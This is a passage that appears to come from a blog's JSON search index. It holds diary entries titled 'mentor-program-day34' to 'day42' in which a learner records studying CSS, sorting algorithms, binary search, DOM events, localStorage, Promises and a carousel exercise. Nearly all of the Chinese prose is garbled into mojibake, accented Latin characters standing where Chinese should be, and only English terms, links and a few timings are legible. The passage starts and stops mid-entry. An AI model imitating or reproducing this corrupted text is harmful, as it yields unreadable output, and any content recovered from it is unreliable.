´é—œï¼Œæ‰€ä»¥å¿ƒå¾—çš„éƒ¨åˆ†å°±ç›´æ¥åƒè€ƒ HTTP Challenge æ”»ç•¥èˆ‡å¿ƒå¾— å§ï¼ é¡Œå¤–è©±æœ‰äººè©¦éã€Œé®ªé­šè›‹é£¯ã€å—ï¼Ÿé€™æ˜¯ä¸€é“ä¾¿å®œåˆå¥½åƒçš„æ–™ç†ï¼Œåªéœ€è¦ï¼š è›‹ ç™½é£¯ é®ªé­šç½é ­ å°±å¯ä»¥æ»¿è¶³ä¸€é¤çš„ç¾å‘³ä½³é¤šï¼Œä¸çŸ¥é“ç‚ºä»€éº¼å¤–é¢æ²’æœ‰è³£é€™ç¨®ç¾é£Ÿå‘¢ï¼Ÿ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week6 çš„ä½œæ¥­åšå®Œã€‚","link":"/2022/01/15/mentor-program-day34/"},{"title":"mentor-program-day35","text":"GOGOGOï½ é€²åº¦ä»Šå¤©æŠŠä»¥å‰åšçš„ç­†è¨˜é‡æ–°æ•´ç†ï¼Œä¹Ÿé †ä¾¿è¤‡ç¿’ä¸€ä¸‹ï¼š CSS ä¸­é‚£äº›å¸¸å¸¸å¿˜è¨˜çš„é è¨­å€¼ ä½¿ç”¨ ä¾†è¨­å®š RWD åœ–ç‰‡ CSS ä¸­çš„ counter å±¬æ€§ è®“ä½ ä¸å†ç…©æƒ±åœ–ç‰‡å°ºå¯¸å•é¡Œï¼Œobject-fit èˆ‡ object-position ç¶²é ä¸­çš„è‹±æ–‡å¤§å°å¯«å•é¡Œ è¢å¹•é–±è®€è€…å‹å–„çš„ a æ¨™ç±¤ å¦‚ä½•æ­£ç¢ºçš„éš±è—æ–‡å­— æ›´å½ˆæ€§åŒ–çš„æ–‡å­—è¨­å®šï¼Œmax-width èˆ‡ max-height CSS ä¹‹æˆ‘çš„ scrollbar æ¯”è¼ƒå¥½çœ‹ CSS ä¸­ html èˆ‡ body çš„å‘ä¸Šå‚³éè¡Œç‚º CSS ä¹‹ inline-block ä¸­çš„é­”æ³•é–“è· CSS ä¹‹ èˆ‡ çš„å¯¬é«˜ CSS ä¹‹ margin è² å€¼çš„å…§æ¶µ CSS ä¹‹ä»€éº¼æ™‚å€™è©²è¨­å®šæˆç›¸å°å–®ä½ è®“ç¶²é è®Šå¾—æ›´æ½®ï¼Œprefers-color-scheme CSS ä¸­çš„ overflow èˆ‡åœ“è§’çš„é—œä¿‚ å¯«å®Œæ‰ç™¼ç¾çœŸå¤šå•Šã€‚ å­¸åˆ°çš„äº‹æƒ…ä»¥å‰å¯«çš„å¤§å¤šæ˜¯è·Ÿ CSS æœ‰é—œçš„æ±è¥¿ï¼ŒæŒºæ‡·å¿µä»¥å‰ç‚ºäº† CSS é‚„ç‰¹åˆ¥å»æ‰¾ Spec ä¾†çœ‹ï¼ŒçœŸæ˜¯æŒºç‹‚ç†±çš„ã€‚ è¦ºå¾—æœ€æœ‰ç”¨çš„æ±è¥¿æ˜¯ CSS çš„å±¬æ€§å§ï¼Œåƒ object-fit è·Ÿ object-positionã€‚è‡³æ–¼å…¶ä»–å¤§å¤šæ˜¯è§€å¿µè£œå……ï¼Œå°±æ˜¯é‚£ç¨®ç›®å‰ç”¨ä¸åˆ°ï¼Œä½†ä¹Ÿè¨±å°‡ä¾†æŸå¤©æœƒç”¨åˆ°çš„é‚£ç¨®ã€‚ é¡Œå¤–è©±ä»Šå¤©çš„é¬¼æ»…ä¸éŒ¯å“¦ï¼Œæ„Ÿè¦ºè¶Šä¾†è¶Šç²¾å½©äº†ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥ week7 çš„é€²åº¦ã€‚","link":"/2022/01/16/mentor-program-day35/"},{"title":"mentor-program-day36","text":"æ˜å¤©ç¹¼çºŒåŠ æ²¹ã€‚ é€²åº¦ä»Šå¤©å¿ƒè¡€ä¾†æ½®è£œäº†ä¸€ä¸‹æ¼”ç®—æ³•çš„å‘ï¼š æ·ºè«‡æ™‚é–“è¤‡é›œåº¦èˆ‡ç©ºé–“è¤‡é›œåº¦ é¸æ“‡æ’åºæ³•ï¼ˆSelection sortï¼‰ æ³¡æ²«æ’åºæ³•ï¼ˆBubble-sortï¼‰ æ’å…¥æ’åºæ³•ï¼ˆInsertion-sortï¼‰ å¿«é€Ÿæ’åºæ³•ï¼ˆQuick-sortï¼‰ å¸Œæœ›æœªä¾†èƒ½å¯«å¾—è¶Šä¾†è¶Šå¥½QQ å­¸åˆ°çš„äº‹æƒ…å¾ˆé›£å¾—çš„ä¾†ç¢°äº†æ¼”ç®—æ³•ï¼Œä»¥å‰ä¸€ç›´æ²’æœ‰æŠŠé€™å¡Šå­¸å¥½ï¼Œä½†ä»Šå¤©å­¸äº†ä¸€äº›åŸºç¤æ¦‚å¿µï¼Œå¸Œæœ›æœªä¾†èƒ½è¶Šä¾†è¶Šå²å®³ã€‚ ä»Šå¤©å­¸åˆ°çš„æ’åºæ³•å…¶å¯¦å¤§éƒ¨åˆ†éƒ½ä¸ç®—æŠ½è±¡ï¼ˆå¦‚æœæ˜¯ç”¨å¤§è…¦ä¾†æ€è€ƒçš„è©±ï¼‰ï¼Œä¸»è¦æ˜¯è¦ã€ŒæŠŠæƒ³æ³•è½‰è®Šæˆå¯åŸ·è¡Œæ­¥é©Ÿã€é€™ä¸€é»æ¯”è¼ƒè¤‡é›œä¸€é»ã€‚é›–ç„¶æœ‰äº›æ™‚å€™è »é ­ç–¼çš„ï¼Œä½†æ˜¯å°±ç•¶ä½œåœ¨ç·´åŠŸé€™æ¨£å§ï¼Œç•¶æœƒçš„æŠ€èƒ½è·Ÿæ¦‚å¿µè¶Šä¾†è¶Šå¤šçš„æ™‚å€™ï¼Œç›¸ä¿¡è‡ªå·±å°±æœƒè¶Šä¾†è¶Šå¼·äº†ã€‚ é¡Œå¤–è©±ä»Šå¤©çš„å°ç•¶å®¶æ˜¯æ­£ç‰ˆï¼Œå¤ªæ£’å•¦ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥é–‹å§‹ week7 çš„é€²åº¦ã€‚","link":"/2022/01/17/mentor-program-day36/"},{"title":"mentor-program-day37","text":"å¸Œæœ›èƒ½ç¶­æŒä¸€æ¨£çš„é€²åº¦ã€‚ é€²åº¦ä»Šå¤©çµ‚æ–¼æŠŠäºŒåˆ†æœå°‹æ³•ææ‡‚ï¼Œä¹Ÿé–‹å§‹é€²åˆ° week7 çš„é€²åº¦ï¼š äºŒåˆ†æœå°‹æ³•ï¼ˆBinary-searchï¼‰ ä»€éº¼æ˜¯ DOMï¼Ÿ é—œæ–¼ &lt;script&gt; çš„æ”¾ç½®ä½ç½® ç”¨ DOM é¸åˆ°æƒ³è¦çš„å…ƒç´  ç”¨ DOM æ”¹è®Šå…ƒç´ çš„ CSS ç”¨ DOM æ”¹è®Šå…ƒç´ çš„ Class ç”¨ DOM æ”¹è®Šå…ƒç´ å…§å®¹ ç”¨ DOM æ’å…¥æˆ–åˆªé™¤å…ƒç´  é—œæ–¼ event(e) é˜»æ­¢é è¨­è¡Œç‚º preventDefaut äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼æ•ç²èˆ‡å†’æ³¡ å­¸åˆ°çš„äº‹æƒ…å¾ˆé–‹å¿ƒä»Šå¤©æŠŠäºŒåˆ†æœå°‹æ³•çµ¦å­¸å®Œäº†ï¼Œè€Œä¸”å®ƒçœŸçš„æ˜¯è »æœ‰æ•ˆç‡çš„ä¸€ç¨®æœå°‹æ³•ï¼Œé™„ä¸Š LIOJ ä¸Šçš„æ•¸æ“šï¼š Time: 240ms Memory: 37MB (basic)Time: 156ms Memory: 37MB (binary-search: while)Time: 160ms Memory: 36MB (binary-search: recursive) å°æ–¼ DOM å…ƒç´ çš„åŸºæœ¬æ“ä½œä¹Ÿç®—å¤§æ¦‚ç†è§£äº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯é å¯¦ä½œä¾†ç´¯ç©ç¶“é©—äº†ã€‚ å¦å¤–ä¹ŸæŠŠä¸€äº›ä»¥å‰ä¸å¤ªæ‡‚çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶çµ¦å¼„æ¯”è¼ƒæ¸…æ¥šäº†ï¼Œæ˜å¤©å†æŠŠä¸€äº›ç´°ç¯€çš„éƒ¨ä»½çµ¦ææ‡‚æ‡‰è©²å°±æ²’å•é¡Œäº†ï¼Œæ£’ï¼ é¡Œå¤–è©±é­šçš®æ¹¯æ˜¯å€‹å¥½æ±è¥¿ï¼Œä¾¿å®œå¥½åƒåˆå¥åº·ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ [FE102] çœ‹åˆ°æŒ‡å®šéƒ¨åˆ†ï¼Œç„¶å¾Œé–‹å§‹åšä½œæ¥­ã€‚","link":"/2022/01/18/mentor-program-day37/"},{"title":"mentor-program-day38","text":"é›¢ç›®æ¨™è¶Šä¾†è¶Šè¿‘äº†å—ï¼Ÿ é€²åº¦ä»Šå¤©æŠŠäº‹ä»¶å‚³éæ©Ÿåˆ¶åˆå¼„å¾—æ›´å®Œæ•´ä¸€äº›ï¼Œä¹Ÿé‡æ–°è¤‡ç¿’äº†ä¸€é»ä½œç”¨åŸŸçš„æ¦‚å¿µï¼š é˜»æ­¢äº‹ä»¶å‚³é stopPropagation preventDefault çš„å°çŸ¥è­˜ è¬äº‹æ‹œè¨—ä½ å›‰ï¼Event-delegation æ©Ÿåˆ¶ å†æ¬¡ç†è§£ä»€éº¼æ˜¯ä½œç”¨åŸŸï¼Ÿ é—œæ–¼ &lt;input&gt; çš„å¯¬åº¦å•é¡Œ ä¹Ÿè·Ÿè‘— [FE102] çš„å…§å®¹åšäº†ç°¡å–®çš„å°ç©å…·ã€‚ å¯†ç¢¼ç”¢ç”Ÿå™¨ï¼š See the Pen ç°¡æ˜“å¯†ç¢¼ç”¢ç”Ÿå™¨ by PeaNu (@jubeatt) on CodePen. å‹•æ…‹é€šè¨ŠéŒ„è¡¨å–®ï¼š See the Pen å‹•æ…‹é€šè¨ŠéŒ„è¡¨å–® by PeaNu (@jubeatt) on CodePen. å­¸åˆ°çš„äº‹æƒ…åœ¨ä¸€é–‹å§‹å­¸ Event-delegation çš„æ™‚å¾ŒæœƒæŠŠå®ƒè·Ÿäº‹ä»¶å‚³éçš„æ©Ÿåˆ¶ææ··ï¼Œä¸éåœ¨å¯¦ä½œç·´ç¿’å¾Œæœ‰æ¸…æ¥šè¨±å¤šã€‚åƒæ˜¯ delegation çš„æ©Ÿåˆ¶æ˜¯å› ç‚ºã€Œå†’æ³¡ã€è·Ÿã€Œæ•ç²ã€éšæ®µæ™‚éƒ½æœƒç¶“éçˆ¶å…ƒç´ ï¼Œæ‰€ä»¥æ‰å¯ä»¥é€™æ¨£å­ç”¨ï¼Œæˆ‘åŸæœ¬ä»¥ç‚ºæ˜¯åªæœ‰å†’æ³¡éšæ®µæ‰æœƒå‚³åˆ°çˆ¶å…ƒç´ ï¼Œä½†ç¾åœ¨ææ¸…æ¥šäº†ã€‚ æ„Ÿè¦ºæ“ä½œ DOM ç¢ºå¯¦éœ€è¦å¤šç·´ç¿’ï¼Œä¸ç„¶æœ‰äº›æ™‚å€™æœƒéœ§ç…ç…çš„ï¼Œä½†ç›¸ä¿¡å¤šç´¯ç©ç¶“é©—å°±æœƒè¶Šä¾†è¶Šç†Ÿæ‚‰å§ï¼ é¡Œå¤–è©± èŠ±ç”Ÿé†¬è›‹é¤…ï¼Œå¥½åƒã€‚ æœ€è¿‘æ²’ä»€éº¼éˆæ„Ÿï¼Œå¯èƒ½æœ€è¿‘ä¸€ç›´æƒ³è¶•é€²åº¦å§ï¼Œæ‰€ä»¥å°±å°‘äº†ä¸€é»æ™‚é–“ä¾†æ‰“å¿ƒå¾—è·Ÿå»¢æ–‡ã€‚å¸Œæœ›æœªä¾†æ™‚é–“æ¯”è¼ƒå……è¶³çš„æ™‚å€™æˆ‘èƒ½æ‰“æ›´å¤šåˆè‡­åˆé•·çš„å»¢æ–‡ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ [FE102] çš„éƒ¨åˆ†è§£æ±ºï¼Œç„¶å¾Œé–‹å§‹åšä½œæ¥­ï¼","link":"/2022/01/20/mentor-program-day38/"},{"title":"mentor-program-day39","text":"ä¸€é€±éçš„çœŸå¿«ã€‚ é€²åº¦ä»Šå¤©æŠŠ [FE102] çš„æŒ‡å®šéƒ¨åˆ†çœ‹å®Œäº†ï¼Œä¸€å¦‚å¾€å¸¸çš„åšäº†ç­†è¨˜ï¼š å€Ÿæ”¾ä¸€ä¸‹å•Šï¼localStorage èˆ‡ sessionStorage DOM å†·çŸ¥è­˜ï¼åœ¨ä¸€å€‹ç¯„åœå…§æ‰¾å‡ºå…ƒç´  æŠŠ Object çš„ value æŠ½å‡ºä¾†è®Šæˆ Array æŠŠ Array-like-object è®Šæˆ Array ä¹Ÿå¯¦ä½œäº†ä¸€ä¸‹ä»¥å‰æ²’æœ‰å¾ˆæ¸…æ¥šçš„ localStorage è·Ÿ sessionStorageï¼š See the Pen localStorage ç°¡å–®ä½¿ç”¨ by PeaNu (@jubeatt) on CodePen. æœ€å¾Œä¹Ÿåˆ©ç”¨æ™‚é–“æŠŠ week7 çš„ç¬¬ä¸€å€‹ä½œæ¥­çµ¦å®Œæˆäº†ã€‚ éŒ¯èª¤åˆ¤æ–·ï¼š æˆåŠŸé€å‡ºï¼š å­¸åˆ°çš„äº‹æƒ…æåˆ° localStorage è·Ÿ sessionStorage å°±è®“æˆ‘æƒ³åˆ°æˆ‘ä¸€é–‹å§‹å­¸å‰ç«¯æ™‚æ‰€çœ‹çš„æ›¸ï¼šHTML5+CSS3+jQuery Mobileè¼•é¬†æ‰“é€ Appèˆ‡è¡Œå‹•ç¶²ç«™ é‚£æ™‚å€™çš„æˆ‘é€£ JavaScript éƒ½é‚„å¾ˆé™Œç”Ÿï¼Œå°±æŒ‰ç…§æ›¸ä¸­çš„ç¯„ä¾‹ç”¨ localStorage åšäº†ä¸€å€‹å¾ˆç°¡å–®çš„ç™»å…¥ç³»çµ±ã€‚è€å¯¦èªªå¯¦éš›ä¸Šåœ¨åšä»€éº¼æˆ‘æ¯«ç„¡é ­ç·’ï¼Œåªæ˜¯å–®ç´”çš„æŒ‰ç…§ code ä¾†é‚ŠæŠ„é‚Šç·´ç¿’ã€‚ç¾åœ¨å›æƒ³èµ·ä¾†é‚„æŒºæ‡·å¿µçš„ï¼Œé€™å°±å¥½åƒä½ ç©éŠæˆ²è½‰è·æˆéŠä¿ å¾Œæœƒé–‹å§‹æ‡·å¿µç•¶åˆé‚£å€‹é‚„æ˜¯å¼“ç®­æ‰‹çš„åˆå¿ƒè€…æ™‚å…‰ã€‚åŸä¾†æ™‚é–“éå¾—å¥½å¿«ï¼Œå¥½å¿«ã€‚ åœ¨å¯« week7 çš„ä½œæ¥­æ™‚ï¼Œå› ç‚ºè¦æ“ä½œ DOM ä¾†æ”¹è®Šä»‹é¢ï¼Œæ‰€ä»¥ä¸€å®šæœƒç¢°åˆ°ã€Œæ‰¾åˆ°ç›¸é„°ç¯€é»ã€é€™ä»¶äº‹ã€‚æˆ‘ä¸å¾—ä¸åæ§½ä¸€ä¸‹ã€Œæ–‡å­—ç¯€é»ã€çœŸçš„æ˜¯ä¸€å€‹æœ‰å¤ é›·çš„æ±è¥¿ï¼Œé›–ç„¶å®ƒèƒŒå¾Œä¹Ÿè¨±é‚„æ˜¯æœ‰æŸå€‹å­˜åœ¨çš„å¿…è¦ï¼Œä½†é€™å°±è·Ÿ CSS ä¹‹ inline-block ä¸­çš„é­”æ³•é–“è· ä¸€æ¨£ï¼Œè¸©åˆ°çš„æ™‚å€™å¿ƒä¸­å„ç¨®ã€ŒWTFã€ï¼Œæ€ªä¸å¾— jQuery çš„ä½œè€…æœƒæŠŠå®ƒçµ¦è™•ç†æ‰ã€‚ æœ€å¾Œè¦ºå¾— Code Review ä¹Ÿè¨±çœŸçš„æ˜¯å€‹å¾ˆé‡è¦çš„æ±è¥¿ï¼Œå¾åˆ¥äººçš„ code çœŸçš„èƒ½å­¸åˆ°å¾ˆå¤šæœ‰è¶£çš„æ±è¥¿ï¼Œæˆ–è€…æ˜¯æ–°çš„ç™¼ç¾ã€‚ä½†æœ‰äº›æ™‚å€™å»å¥½æ‡¶å¾— Reviewï¼Œä¸æ˜¯èªªä¸å–œæ­¡ Review é€™ä»¶äº‹æœ¬èº«ï¼Œè€Œæ˜¯ Review æ˜¯è¦èŠ±æ™‚é–“çš„ï¼Œæ‰€ä»¥å°±æœƒé™·å…¥ã€Œåˆ°åº•è©²èŠ±æ™‚é–“ Review é‚„æ˜¯è¶•é€²åº¦ã€çš„çª˜å¢ƒã€‚å”‰ï½æ™‚é–“æœç„¶æ˜¯äººé¡çš„æœ€å¤§å¼·æ•µã€‚ é¡Œå¤–è©±åœ¨ç–«æƒ…é‚„æ²’æœ‰è¶Šä¾†è¶Šåš´é‡ä¹‹å‰ï¼Œè¦å»è·Ÿå¥³æœ‹å‹åƒé¬†é¤…ï¼Œé–‹å¿ƒï¼ é‚„æ˜¯å¸Œæœ›ç–«æƒ…ä¸è¦è¶Šä¾†è¶Šåš´é‡æ‰å¥½ï¼Œå¦‚æœæ¯å€‹äººéƒ½èƒ½å¥½å¥½æ³¨æ„å°±å¥½äº†ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week7 çš„ä½œæ¥­å®Œæˆï¼Œå¯ä»¥çš„è©±æœ€å¥½ä¹ŸæŠŠæŒ‘æˆ°é¡Œåšå®Œã€‚","link":"/2022/01/20/mentor-program-day39/"},{"title":"mentor-program-day40","text":"å†è¦‹äº†é¬†é¤…ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒåšç¬¬ä¸ƒé€±çš„ä½œæ¥­ï¼Œåœ¨è‡ªæˆ‘æª¢è¨çš„æ™‚å€™å­¸åˆ°äº†ä¸€é»å°æŠ€å·§ï¼š DOM æ¸…æ‰æƒ±äººçš„æ–‡å­—ç¯€é» å¯¦ä½œ DOM çš„ closest æ–¹æ³• é™„ä¸Šä»Šå¤©åšçš„ä½œæ¥­ HW2ï¼š HW3ï¼ˆåˆ‡åˆ°ä¸€åŠçš„ç‰ˆï¼‰ï¼š ä¹Ÿæ˜¯è¿…é€Ÿçµ¦ä»–åˆ‡å®Œï¼Œé›–ç„¶å¾ˆå¤šå–®ä½éƒ½æ†‘æ„Ÿè¦ºåœ¨è¨­ XDï¼Œä½†ä¸ç®¡äº†å•¦ï½åæ­£é‡é»æ˜¯è¦ç·´ç¿’æ“ä½œ DOMã€‚ å­¸åˆ°çš„äº‹æƒ…å¥½æƒ³æŠŠéè¿´ç²¾é€šé˜¿ã€‚ ä¸éé‚„æ˜¯æ²’æœ‰å®Œå…¨æŠ“åˆ°é‚£å€‹ã€Œå¯ä»¥éš¨å¿ƒæ‰€æ¬²ä½¿ç”¨çš„ Fuã€ï¼Œç›®å‰çš„ç¨‹åº¦é‚„æ˜¯çœ‹åˆ¥äººçš„ code æ‰æœƒæƒ³åˆ°ã€Œå“¦å°è€¶ï¼Œé€™å¯ä»¥éè¿´ä¾†è§£é˜¿ã€ï¼Œä½†æ˜¯æ²’é—œä¿‚ï¼Œå°±å¤šå¤šç·´ç¿’åšç­†è¨˜ï¼Œç¾åœ¨ä¹Ÿåšéè »å¤šéè¿´çš„é¡Œç›®äº†ï¼Œç›¸ä¿¡ä¹‹å¾Œèƒ½è¶Šä¾†è¶Šç†Ÿçš„ã€‚ å¦å¤–èªªå€‹å°æ‚²åŠ‡ï¼Œä»Šå¤©åœ¨è™•ç† branch çš„æ™‚å€™ä¸å°å¿ƒæŠŠ wee7 çš„ hw1 ä½œæ¥­æª”æ¡ˆçµ¦èª¤åˆªï¼Œå®³æˆ‘åˆå¾—é‡åšä¸€æ¬¡ï¼é‚„å¥½æ˜¯æ˜¨å¤©å‰›åšå®Œè¨˜æ†¶é‚„å¾ˆçŒ¶æ–°ï¼Œé‡æ–°å¼„éæ²’æœ‰èŠ±å¾ˆå¤šæ™‚é–“ã€‚ä½†ä¸‹æ¬¡çœŸçš„è¦å°å¿ƒä¸€é» orz é—œæ–¼ DOM çš„æ–‡å­—ç¯€é»é›£é¡Œè®“æˆ‘æƒ³åˆ°ä¹‹å‰åœ¨å¯«é¢è©¦æ¸¬é©—çš„ä¸€å€‹å•é¡Œï¼Œå‰›å¥½å°±æ˜¯è¦æ‰¾å‡º xx å…ƒç´ ä¸Šé¢æœ‰å¹¾å€‹çˆ¶å…ƒç´ é€™ç¨®é¡Œå‹ã€‚å¯æƒœé‚£æ™‚å€™é‚„å¾ˆèœï¼Œå…‰æ˜¯è™•ç†æ–‡å­—ç¯€é»å°±æ‰‹å¿™è…³äº‚ï¼Œå¦‚æœç¾åœ¨åœ¨è€ƒä¸€æ¬¡èªªä¸å®šå°±èƒ½åˆ©ç”¨ä»Šå¤©å­¸æœƒçš„éè¿´ä¾† PASSã€‚ é¡Œå¤–è©± å†è¦‹äº†é¬†é¤…ï¼Œå¸Œæœ›ä¸‹æ¬¡è¦‹é¢ä¸æœƒå¤ªä¹… å¯æƒœé«˜é›„çš„ç–«æƒ…å¯¦åœ¨å¤ªåš´é‡äº†ï¼Œæœ‰é»æ“”å¿ƒï¼Œæ‰€ä»¥åªå¥½ç­‰ä¹‹å¾Œäº† QQ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week7 çš„ä½œæ¥­å®Œæˆï¼Œå¯ä»¥çš„è©±æŒ‘æˆ°é¡Œä¹Ÿé †ä¾¿ï¼","link":"/2022/01/21/mentor-program-day40/"},{"title":"mentor-program-day41","text":"ç¾åœ¨è…¦è¢‹æ»¿æ»¿çš„ Promiseã€‚ é€²åº¦ä»Šå¤©æŠŠç¬¬ä¸ƒé€±çš„ todo list çµ¦å®Œæˆäº†ï¼š ç¡¬è¦åŠ å€‹ç´…ç¶ ç‡ˆçœ‹èµ·ä¾†æ¯”è¼ƒå¼·å¤§ ( ï½â€™Ï‰â€™)ï½ å¾Œä¾†å› ç‚ºå‰›åˆ‡å®Œç‰ˆæš«æ™‚ä¸æƒ³å†åˆ‡ï¼Œè·‘å»ç ”ç©¶ Promise Async Await ç›¸é—œçš„æ±è¥¿ï¼Œä¹Ÿé †ä¾¿æŠŠç¢°åˆ°çš„å•é¡Œåšäº†äº›ç­†è¨˜ï¼š Promise çš„å°æŠ€å·§ åŸ·è¡Œ IIFE çš„ä¸‰ç¨®æ–¹å¼ è®“ click å’Œ enter è§¸ç™¼åŒå€‹äº‹ä»¶ CSS çš„çµ•å°å®šä½ç¯„åœ åœ¨ CSS ä¸­åšå­—ä¸²æ‹¼æ¥ å¸Œæœ›æˆ‘çœŸçš„ææ‡‚ Promise äº†ï½ å­¸åˆ°çš„äº‹æƒ…å…ˆä¾†è«‡è«‡é—œæ–¼ todo list å§ï¼Œå…¶å¯¦åšèµ·ä¾†æ¯”æˆ‘é æœŸä¸­çš„ç°¡å–®å¾ˆå¤šï¼ŒåŸä¾†ç”¨åŸç”Ÿ JavaScript ä¾†å¯«æ±è¥¿å°±æ˜¯é€™ç¨®æ„Ÿè¦ºï¼Œå¾ˆèˆ’æš¢ï¼Œæ€ªä¸å¾—æœ‰äº›äººå°æ–¼ Vanilla JS æŠ±æŒåŸ·è‘—ï¼Œå¤§æ¦‚èƒ½ç†è§£äº†ã€‚ ä¸éæˆ‘ä¹ŸçŸ¥é“ï¼Œç›®å‰åšçš„ç®—æ˜¯æœ€åŸºæœ¬çš„åŠŸèƒ½è€Œå·²ï¼Œæ‰€ä»¥å¸Œæœ›æœ‰ç©ºçš„è©±èƒ½åŠ ä¸€äº›æ›´çŒ›çš„åŠŸèƒ½ï¼Œåƒæ˜¯ localStorage æˆ– filter ä¹‹é¡çš„ã€‚ æ¥ä¸‹ä¾†ä¾†è«‡è«‡é—œæ–¼ Promiseï¼Œå…¶å¯¦æ˜¯å› ç‚ºæŸå€‹ å·´å‹ ç”¨ JavaScript å¯«äº†å¾ˆå¤šå°ç©å…·çµ¦å·´å‹ï¼Œå…¶å¯¦ä»¥å‰å°±æœ‰çœ‹éä»–çš„ code è·Ÿå°å±‹ï¼Œä½†ç•¶æ™‚çš„æˆ‘å¤ªèœäº†æ‰€ä»¥æ²’æœ‰å®Œå…¨çœ‹æ‡‚ã€‚ä»Šå¤©å†å›éé ­ä¾†çœ‹ç™¼ç¾è‡ªå·±å¤§æ¦‚å·²ç¶“èƒ½çœ‹æ‡‚ 80%ï¼Œç”šè‡³è¦è‡ªå·±å¯«ä¸€å€‹åŒæ¨£çš„æ±è¥¿å‡ºä¾†æ„Ÿè¦ºä¹Ÿä¸æ˜¯å•é¡Œï¼Ÿ æ‰€ä»¥å°±æŠ±è‘—é€™è‚¡ç†±è¡€æ²¸é¨°çš„å¿ƒå»åšäº†å¾ˆå¤š Promise çš„ç›¸é—œç·´ç¿’ã€‚é›–ç„¶åšçš„é€”ä¸­ç™¼ç¾è‡ªå·±æœ‰äº›è§€å¿µé‚„æ˜¯ä¸å¤ æ¸…æ¥šï¼Œä½†è‡³å°‘æœ‰æ‰¾å‡ºè‡ªå·±çš„éŒ¯èª¤ï¼Œæˆ‘æƒ³é€™é»æ˜¯å¥½çš„ï¼ŒçŸ¥é“éŒ¯èª¤æ‰çŸ¥é“è¦æ€éº¼æ”¹å–„ã€‚æ¥ä¸‹ä¾†è¦å¤šå¤šç·´ç¿’ï¼Œè®“è‡ªå·±è¶Šä¾†è¶Šå¼·ï¼ é¡Œå¤–è©± ä¸ƒæ˜Ÿç ´è»æˆ‘ä¸è¡Œäº† é€™å€‹æ¢—ç©å¹¾ééƒ½ç©ä¸è†© (ã‚âˆ€ï½¥)b æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥åšåšçœ‹ week7 çš„æŒ‘æˆ°é¡Œï¼Œä¼¼ä¹æ˜¯ carouselï¼Ÿæˆ–æ˜¯ä¹Ÿå¯ä»¥æŠŠ todo app åŠ é»æ–°åŠŸèƒ½ï¼ŒæœŸå¾…è‡ªå·±çš„ä½œå“è¶Šä¾†è¶Šè±å¯Œï¼","link":"/2022/01/23/mentor-program-day41/"},{"title":"mentor-program-day42","text":"ç»çµ¦ Carousel çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©åšäº†ç¬¬ä¸ƒé€±çš„æŒ‘æˆ°é¡Œï¼š æœ¬ä¾†åªæ‰“ç®—åšå‡ºåŸºæœ¬åŠŸèƒ½å°±æ”¶æ‰‹ï¼Œä½†å¾Œä¾†æƒ³æ”¯æ´ RWD åˆåŠ äº†ä¸€é»æ±è¥¿ï¼›å¯«å®Œ RWD å¾Œåˆç™¼ç¾èƒ½åœ¨åˆ©ç”¨ JavaScript ä¾†è®“æ±è¥¿è®Šæˆå‹•æ…‹ç”¢ç”Ÿï¼›ç›´åˆ°æœ€å¾Œæƒ³èªªï¼š ã€Œå•Šï¼æ—¢ç„¶éƒ½å¯«åˆ°é€™è£¡äº†ï¼Œå€’ä¸å¦‚å¯«æˆä¸€å€‹æ¨¡çµ„ï¼Ÿç•¢ç«Ÿ Carousel é€™æ±è¥¿é‚„è »å¸¸è¦‹çš„ã€ æ‰€ä»¥å°±çœŸçš„å¯«æˆä¸€å€‹å¾ˆã€Œé™½æ˜¥ç‰ˆã€çš„ å°å¥—ä»¶ äº†ã€‚ å­¸åˆ°çš„äº‹æƒ… æŠŠå¤§å•é¡Œæ‹†æˆå°å•é¡Œ é€™å¥è©±å°æˆ‘ä¾†èªªä¸€ç›´éƒ½éƒ½å¾ˆç¶“å…¸ä¹Ÿå¾ˆå¯¦ç”¨ï¼Œå¾ä¸€é–‹å§‹åˆ‡ Carousel çš„ç‰ˆé¢ï¼Œæ¥è‘—å¯« JavaScript ä¾†æ§åˆ¶å¹»ç‡ˆç‰‡ï¼Œæˆ‘éƒ½æ˜¯ä¸€æ­¥ä¸€æ­¥ä¾†ï¼Œå› ç‚ºæˆ‘è‡ªèªæˆ‘çš„è…¦å®¹é‡å¾ˆå°ã€‚ä¸è¦æ±‚ä¸€é–‹å§‹å°±è¨­æƒ³å…¨å±€ï¼Œåªæ±‚å…ˆæŠŠæ±è¥¿åšå‡ºä¾†ï¼Œä¹‹å¾Œå†æ…¢æ…¢å„ªåŒ–ã€‚ ä»¥å‰çœ‹åˆ°éœ¹é‚å•ªå•¦ä¸€å¤§å †çš„ç¨‹å¼ç¢¼å°±æœƒè…¦è¢‹å¾ˆæ··äº‚ã€‚ä½†å¦‚åŒ Huli æ‰€èªªï¼Œå…¶å¯¦åªè¦å¥½å¥½å»åšåˆ°ã€Œå‘½åã€è·Ÿã€Œæ’ç‰ˆã€å°±èƒ½æ”¹å–„é€™å€‹å•é¡Œã€‚é›–ç„¶æœ‰æ™‚å€™é‚„æ˜¯æœƒå¤šåˆ°çœ¼èŠ±ç­äº‚å•¦ï¼Œä½†è¦ºå¾—ç¾åœ¨è‡ªå·±ä¸å†é‚£éº¼å®³æ€•ã€Œç¨‹å¼ç¢¼å¥½äº‚å¥½é›œã€é€™ä»¶äº‹äº†ã€‚ ç•¶ä½ è¦çš„åŠŸèƒ½è¶Šå¤šï¼Œæˆ–æ˜¯ CSS è¦å‰‡è¶Šå¤šï¼Œç¨‹å¼ç¢¼å°±ä¸€å®šä¹Ÿæœƒç›¸å°å¢åŠ ã€‚ä½ ä¸å¯èƒ½æ°¸é æœŸæœ›ç¨‹å¼ç¢¼çœ‹èµ·ä¾†å¾ˆä¹¾æ·¨ï¼Œè€Œæ˜¯ä½ 